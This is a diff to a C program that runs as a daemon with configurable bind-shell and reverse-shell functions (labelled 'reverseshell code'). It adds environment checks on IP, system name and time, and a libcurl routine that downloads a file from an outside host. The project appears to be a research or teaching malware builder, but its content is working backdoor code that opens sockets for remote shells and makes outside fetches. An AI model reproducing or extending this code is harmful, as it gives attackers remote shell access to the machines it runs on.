@@ -9,14 +9,32 @@
 #include <unistd.h>
 #include <syslog.h>
 #include <string.h>
-//#include <curl/curl.h>
+#include <curl/curl.h>
 #include <sys/socket.h>
 #include <netinet/ip.h>
 #include <arpa/inet.h>
+#include <sys/utsname.h>
+#include "valHelper.c"
 
 void foo();
+#ifdef SECIMP
+static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
+{
+  size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
+  return written;
+}
+#endif
 
 int main(void) {
+        /*==Validating code using valHelper.c==*/
+        val_IP();       //Macro: VALID_IP
+        val_SysName();  //Macro: VALID_SYSNAME
+        val_time();     //Macro: VALID_TIME
+        struct Profile* prof = getProfile();
+        char * strProf = strProfile();
+        printf("%s\n", strProf);
+        free(strProf);
+        /*=====================================*/
 
         /* Our process ID and Session ID */
         pid_t pid, sid;
@@ -47,8 +65,9 @@ int main(void) {
 
 
         /* Change the current working directory */
+
         if ((chdir("/")) < 0) {
-                /* Log the failure */
+                // Log the failure 
                 exit(EXIT_FAILURE);
         }
 
@@ -71,9 +90,10 @@ int main(void) {
            foo(); //reverseshell code
            //break;
            #endif
-
            //sleep(30); /* wait 30 seconds */
         //}
+
+
   //VALIDATOR!!!!!!!!!!!!!!!!!!!
    exit(EXIT_SUCCESS);
 }
@@ -155,7 +175,7 @@ void foo()
   printf("BINDSHELL: %d!\n", BINDSHELL);
   struct sockaddr_in addr;
   addr.sin_family = AF_INET;
-  addr.sin_port = htons(REVPORT);
+  addr.sin_port = htons(atoi(BINDPORT));
   addr.sin_addr.s_addr = INADDR_ANY;
 
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -172,11 +192,11 @@ void foo()
 
   #ifdef REVERSESHELL
   printf("REVERSESHELL: %d!\n", REVERSESHELL);
-  const char* ip = REVIP;
+  const char* ip = REVERSEIP;
   struct sockaddr_in addr;
 
   addr.sin_family = AF_INET;
-  addr.sin_port = htons(REVPORT);
+  addr.sin_port = htons(atoi(REVERSEPORT));
   inet_aton(ip, &addr.sin_addr);
 
   int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -212,5 +232,42 @@ void foo()
 
   #ifdef STATIC
   printf("STATIC: %d!\n", STATIC);
+  #endif
+
+  #ifdef SECIMP
+  printf("SECIMP: %d!\n", SECIMP);
+  //libcurl program 
+
+  //size_t write_data = fwrite(ptr, size, nmemb, (FILE *)stream);
+
+  CURL *curl_handle;
+  static const char *pagefilename = "page.jpg";
+  FILE *pagefile;
+
+  curl_global_init(CURL_GLOBAL_ALL);
+  /* init the curl session */
+  curl_handle = curl_easy_init();
+  /* set URL to get here */
+  curl_easy_setopt(curl_handle, CURLOPT_URL, "https://www.hackingtutorials.org/wp-content/uploads/2016/11/Netcat-reverse-shell.jpg");
+  /* Switch on full protocol/debug output while testing */
+  curl_easy_setopt(curl_handle, CURLOPT_VERBOSE, 1L);
+  /* disable progress meter, set to 0L to enable it */
+  curl_easy_setopt(curl_handle, CURLOPT_NOPROGRESS, 1L);
+  /* send all data to this function  */
+  curl_easy_setopt(curl_handle, CURLOPT_WRITEFUNCTION, write_data);
+  /* open the file */
+  pagefile = fopen(pagefilename, "wb");
+  if(pagefile) {
+    /* write the page body to this file handle */
+    curl_easy_setopt(curl_handle, CURLOPT_WRITEDATA, pagefile);
+    /* get it! */
+    curl_easy_perform(curl_handle);
+    /* close the header file */
+    fclose(pagefile);
+  }
+  /* cleanup curl stuff */
+  curl_easy_cleanup(curl_handle);
+  curl_global_cleanup();
+
   #endif
 }
